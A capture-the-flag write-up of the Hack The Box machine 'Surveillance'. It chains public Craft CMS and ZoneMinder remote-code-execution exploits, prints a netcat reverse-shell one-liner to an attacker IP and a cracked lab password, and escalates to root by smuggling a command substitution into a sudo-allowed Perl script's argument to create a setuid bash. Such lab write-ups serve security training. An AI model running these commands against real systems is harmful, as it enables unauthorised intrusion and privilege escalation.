---
date: 2024-04-19T15:48:38-05:00
# description: ""
image: "/images/HTB-Surveillance/Surveillance.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Surveillance"
type: "post"
---

* Platform: Hack The Box
* Link: [Surveillance](https://app.hackthebox.com/machines/Surveillance)
* Level: Medium
* OS: Linux
---

Surveillance begins with the discovery of a web application running on port 80, after identifying the software version, we use `CVE-2023-41892` to gain initial access. Through further exploration, we find a database backup leaking the user name and password hash for an admin user, which we utilize to SSH into the system and uncover an internal service. Leveraging SSH tunneling, we access the service and make use of `CVE-2023-26035` to exploit it. Eventually, by exploiting vulnerabilities in certain scripts, we escalate our privileges and gain access to the root account.

Target IP - `10.10.11.245`

## Scanning 

```
nmap -sC -sV -oA nmap/Surveillance 10.10.11.245
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 12:04 CDT
Nmap scan report for 10.10.11.245
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
```

We have two open ports 22 (SSH) and 80 (HTTP - nginx), we are also redirected to `http://surveillance.htb/`.

```
sudo echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The website is for a company offering security services but it does not offer any exploitable features.

![Surveillance website](/images/HTB-Surveillance/surveillance-website.png)

With `Wappalyzer` we discovered that the website is using `Craft CMS`. Going through the source code we find that the version running is `4.4.14`.

![Wappalyzer results](/images/HTB-Surveillance/Wappalyzer.png)

![Craft CMS version](/images/HTB-Surveillance/Craft-CMS-version.png)

Searching for vulnerabilities leads to [CVE-2023-41892](https://www.exploit-db.com/exploits/51918) allowing for unauthenticated remote code execution. A PoC is available [here](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce).

> In my experience the PoC above does not properly work sometimes, if this happens to you use [this one](https://github.com/Faelian/CraftCMS_CVE-2023-41892) instead.

## Initial Foothold

After running the script we get a shell.

![Surveillance initial foothold](/images/HTB-Surveillance/foothold.png)

We seem to be unable to upgrade it so let's redirect it to a netcat listener.

```
nc -lvnp 4444
```

Run the command below on the target (copy it all and paste it in your terminal)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.4 4444 >/tmp/f 
/usr/bin/script -qc /bin/bash /dev/null
```

![Reverse shell transfer](/images/HTB-Surveillance/revshell.png)

We then upgrade the shell we obtain via our listener.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116
```

![New shell](/images/HTB-Surveillance/new-shell.png)

For the system enumeration, we run `linpeas`. We note that `mysql` is running on the target.

![MySQL service](/images/HTB-Surveillance/mysql.png)

![MySQL version](/images/HTB-Surveillance/mysql1.png)

We also find credentials for the MySQL instance. 

![MySQL credentials](/images/HTB-Surveillance/Craft-db-pwd.png)

> We end up finding a `craftdb` database, with a table named `users` but we cannot crack the hashes found there.

A backup of the database is also found on the target in `/var/www/html/craft/storage/backups/`.

![FIles found by linpeas](/images/HTB-Surveillance/files.png)

The archive is sent to our local machine, after unzipping it and checking its content we find a hash for the user `Matthew` which is an admin.

> If you run `cat /etc/passwd` on the target you will indeed see the user `matthew`. 

![matthew user](/images/HTB-Surveillance/matthew.png)

Using [CrackStation](https://crackstation.net/) we confirm that it is a sha256 hash and successfully crack it to recover the password `starcraft122490`.

![matthew user password](/images/HTB-Surveillance/matthew-pwd.png)

With the credentials `matthew:starcraft122490` we log in via SSH and get the user flag.

![user flag](/images/HTB-Surveillance/user-flag.png)

### Port Forwarding

Checking the services running on the target with `ss -lntp` we find something on port `8080`. 

![ss command](/images/HTB-Surveillance/ss-cmd.png)

We use port forwarding to access the service. On our local machine we run

```
ssh -f -N -L 5555:127.0.0.1:8080 matthew@surveillance.htb
```

> The command above establishes a tunnel from the local machine to the remote server `surveillance.htb`.

We then access the service by visiting `localhost:5555`, and find a `ZoneMinder` instance. 

> "ZoneMinder is a free, open source Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras." Source - [ZoneMinder Github](https://github.com/ZoneMinder/zoneminder)

![ZoneMinder instance](/images/HTB-Surveillance/ZoneMinder.png)

Searching `zoneminder exploit` we find a [PoC](https://github.com/rvizx/CVE-2023-26035) for [CVE-2023-26035](https://www.exploit-db.com/exploits/51902) which also leads to unauthenticated RCE.

```
git clone https://github.com/rvizx/CVE-2023-26035
cd CVE-2023-26035
python3 exploit.py -t <target_url> -ip <attacker-ip> -p <port>
```
![ZoneMinder RCE exploit](/images/HTB-Surveillance/ZM-exploit.png)

On our listener we get another shell as `zoneminder`.

![ZoneMinder RCE shell](/images/HTB-Surveillance/ZM-shell.png)

## Privilege Escalation

Running `sudo -l`, we learn that the user `zoneminder` can execute anything matching the pattern `/usr/bin/zm[a-zA-Z]*.pl` with `sudo` privileges without being prompted for a password. Moreover any options can be passed to the commands thanks to the wildcard `*`.

![sudo -l command](/images/HTB-Surveillance/sudo-l.png)

Checking the content of `zmupdate.pl` we see that we can pass some arguments to it with switches like `--version` and `--user`.

![zmupdate script](/images/HTB-Surveillance/zmupdate.png)

So we can potentially make it execute a file for us.

```
echo 'cp /bin/bash /tmp/bash;chmod 4755 /tmp/bash' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```

> When the `exploit.sh` script will be executed, it will create a copy of the `bash` binary in `/tmp` and set its permissions to be executable with elevated privileges (setuid).

With command substitution we execute our script via the `zmupdate.pl` script.

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploit.sh)'
```

> When the command is executed, anything enclosed within `$(...)` is treated as a command to be executed by the shell, and the output of that command replaces the command substitution. In this case, `/tmp/exploit.sh` is a script that creates a setuid binary for `/bin/bash` in the `/tmp` directory.

After starting a new instance of the bash shell we get to root.

```
/tmp/bash -p
```
![root flag](/images/HTB-Surveillance/root-flag.png)

This challenge was pretty straightforward and displayed how tunneling can be used for exploitation. If you want to dive deeper into tunneling Hack The Box has an excellent module on it available [here](https://academy.hackthebox.com/module/details/158). If you want to experiment with different tunneling tools you can check out [awesome-tunneling](https://github.com/anderspitman/awesome-tunneling).

